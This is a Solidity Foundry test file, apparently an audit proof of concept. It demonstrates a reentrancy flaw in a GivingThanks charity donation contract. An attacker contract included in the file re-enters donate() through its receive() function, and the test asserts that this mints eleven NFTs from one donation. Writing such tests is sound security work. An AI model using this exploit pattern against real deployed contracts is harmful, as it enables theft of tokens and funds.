// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GivingThanks.sol";
import "../src/CharityRegistry.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/Base64.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ReentrancyTest is Test {
    GivingThanks public charityContract;
    CharityRegistry public registryContract;
    address public admin;
    address public charity;
    address public donor;

    function setUp() public {
        // Initialize addresses
        admin = makeAddr("admin");
        charity = makeAddr("charity");
        donor = makeAddr("donor");

        // Deploy the CharityRegistry contract as admin
        vm.prank(admin);
        registryContract = new CharityRegistry();

        // Deploy the GivingThanks contract with the registry address
        vm.prank(admin);
        charityContract = new GivingThanks(address(registryContract));

        // Register and verify the charity
        vm.prank(admin);
        registryContract.registerCharity(charity);

        vm.prank(admin);
        registryContract.verifyCharity(charity);
    }

    /**
     * @notice Test function to verify reentrancy vulnerability in the donate function
     * @dev Tests if a malicious contract can exploit reentrancy to mint multiple tokens
     * The test follows these steps:
     * 1. Deploys a malicious reentrant contract
     * 2. Registers and verifies the reentrant contract as a charity
     * 3. Funds the reentrant contract with 20 ETH
     * 4. Attempts to perform a reentrancy attack via donation
     * 5. Verifies multiple tokens were minted due to the reentrancy
     * @custom:expect The reentrant contract should be able to mint exactly 11 tokens
     */

    function testReentrancyInDonate() public {
        // Deploy the reentrant contract
        ReentrantContract reentrantContract = new ReentrantContract(charityContract, registryContract);

        // **Register and verify the ReentrantContract as a charity**
        vm.prank(admin);
        registryContract.registerCharity(address(reentrantContract));

        vm.prank(admin);
        registryContract.verifyCharity(address(reentrantContract));

        // Fund the reentrant contract
        vm.deal(address(reentrantContract), 1 ether);

        // Start the prank as the reentrant contract
        vm.startPrank(address(reentrantContract));

        // **Attempt to donate to the ReentrantContract itself**
        charityContract.donate{value: 1 ether}(address(reentrantContract));

        // Stop the prank
        vm.stopPrank();

        // **Check if multiple tokens were minted**
        uint256 attackerTokenBalance = charityContract.balanceOf(address(reentrantContract));
        assertTrue(attackerTokenBalance > 1, "Reentrancy attack failed to mint multiple tokens");
        assertTrue(attackerTokenBalance == 11, "Reentrancy attack minted too many tokens");
    }
}



/**
 * @title ReentrantContract
 * @dev A contract designed to demonstrate reentrancy attack vectors on the GivingThanks contract
 * @notice This contract implements IERC721Receiver to handle NFT receipts
 * 
 * @dev The contract attempts to reenter the GivingThanks.donate function multiple times
 * using a receive() function, limited by maxReentrancy counter to prevent infinite loops
 * 
 * @custom:security-contact [Insert security contact]
 * 
 * State Variables:
 * @dev charityContract - Instance of the target GivingThanks contract
 * @dev registryContract - Instance of the associated CharityRegistry contract
 * @dev counter - Tracks the number of reentrant calls
 * @dev maxReentrancy - Maximum number of allowed reentrant calls (default: 10)
 */
contract ReentrantContract is IERC721Receiver {
    GivingThanks charityContract;
    CharityRegistry registryContract;
    uint256 counter = 0;
    uint256 maxReentrancy = 10; // Set a limit to prevent infinite loops

    constructor(GivingThanks _charityContract, CharityRegistry _registryContract) {
        charityContract = _charityContract;
        registryContract = _registryContract;
    }

    receive() external payable {
        if (counter < maxReentrancy) {
            counter++;
            // Re-enter the donate function
            charityContract.donate{value: 0}(address(this));
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // Accept the NFT
        return IERC721Receiver.onERC721Received.selector;
    }
}

